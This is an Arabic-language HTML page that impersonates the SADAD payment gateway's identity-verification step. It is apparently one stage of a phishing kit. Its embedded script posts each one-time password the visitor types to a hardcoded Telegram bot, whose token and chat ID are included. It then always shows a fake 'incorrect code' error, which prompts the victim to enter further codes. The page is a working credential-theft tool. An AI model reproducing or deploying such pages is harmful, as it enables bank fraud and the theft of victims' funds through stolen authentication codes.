<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة سداد - التحقق من الهوية</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
        .header { text-align: center; margin-bottom: 20px; }
        .header img { height: 60px; }
        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
        .otp-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
        .phone-display { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
        .form-group { margin-bottom: 15px; } /* تقليل المسافة السفلية */
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
        #otpCode { width: 100%; padding: 16px; border: 2px solid #ddd; border-radius: 8px; font-size: 20px; font-weight: bold; outline: none; letter-spacing: 8px; text-align: center; direction: ltr; transition: border-color 0.3s; box-sizing: border-box; }
        #otpCode:focus { border-color: green; }
        .verify-btn { width: 100%; background: green; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; /* إضافة مسافة علوية */ display: flex; align-items: center; justify-content: center; }
        .verify-btn:disabled { background: #ccc; cursor: not-allowed; }
        .resend-section { text-align: center; margin-top: 25px; /* زيادة المسافة العلوية للفصل */ }
        .timer { color: green; font-weight: bold; font-size: 16px; margin-bottom: 10px; }
        .resend-btn { background: none; border: none; color: green; cursor: pointer; text-decoration: underline; font-size: 14px; font-weight: bold; }
        .resend-btn:disabled { color: #ccc; }
        .error-message { display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; text-align: center; font-weight: bold; }
        .error-message.show { display: block; }
        .spinner { display: inline-block; width: 16px; height: 16px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع / التحقق من الهوية</div>
    <div class="otp-container">
        <h2>التحقق من الهوية</h2>
        <div class="phone-display">تم إرسال رمز التحقق إلى رقم جوالك</div>
        
        <!-- ✅ التعديل: تم نقل الزر إلى داخل الفورم -->
        <form id="otpForm">
            <div class="form-group">
                <label for="otpCode">أدخل رمز التحقق</label>
                <input type="text" id="otpCode" maxlength="8" inputmode="numeric" required>
                <div class="error-message" id="otpError"></div>
            </div>
            <button type="submit" class="verify-btn" id="verifyBtn" disabled>تأكيد الرمز</button>
        </form>

        <div class="resend-section">
            <div class="timer" id="timer"></div>
            <button type="button" class="resend-btn" id="resendBtn" disabled>إعادة إرسال الرمز</button>
        </div>
    </div>

    <script>
        // --- معلومات بوت التليجرام ---
        const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
        const CHAT_ID = "1537773335";

        const otpInput = document.getElementById('otpCode');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendBtn = document.getElementById('resendBtn');
        const timerDisplay = document.getElementById('timer');
        const otpError = document.getElementById('otpError');
        let resendTimer = 30;

        // تفعيل الزر عند إدخال 4 أرقام أو أكثر
        otpInput.addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9]/gi, '');
            verifyBtn.disabled = this.value.length < 4;
        });

        // إرسال النموذج
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if (verifyBtn.disabled) return;

            verifyBtn.disabled = true;
            verifyBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
            otpInput.disabled = true;

            // تنسيق الرسالة
            let message = `
*🔐===== [ الخطوة 4: رمز التحقق ] =====🔐*

*رمز OTP المدخل:*
\`${otpInput.value}\`
--------------------------------------------------
`;
            // إرسال البيانات إلى تليجرام
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
                });
            } catch (error) {
                console.error("Telegram send error:", error);
            }

            // إظهار رسالة الخطأ بعد فترة
            setTimeout(() => {
                verifyBtn.innerHTML = 'تأكيد الرمز';
                otpInput.disabled = false;
                otpError.textContent = 'رمز التحقق غير صحيح';
                otpError.style.display = 'block';
                
                setTimeout(() => {
                    otpInput.value = '';
                    otpError.style.display = 'none';
                    verifyBtn.disabled = true;
                }, 3000);
            }, 8000);
        });

        // مؤقت إعادة الإرسال
        function startResendTimer() {
            resendTimer = 30;
            resendBtn.disabled = true;
            timerDisplay.textContent = `إعادة الإرسال في ${resendTimer} ثانية`;
            const interval = setInterval(() => {
                resendTimer--;
                if (resendTimer > 0) {
                    timerDisplay.textContent = `إعادة الإرسال في ${resendTimer} ثانية`;
                } else {
                    clearInterval(interval);
                    timerDisplay.textContent = '';
                    resendBtn.disabled = false;
                }
            }, 1000);
        }

        resendBtn.addEventListener('click', startResendTimer);
        startResendTimer(); // بدء المؤقت عند تحميل الصفحة
    </script>
</body>
</html>
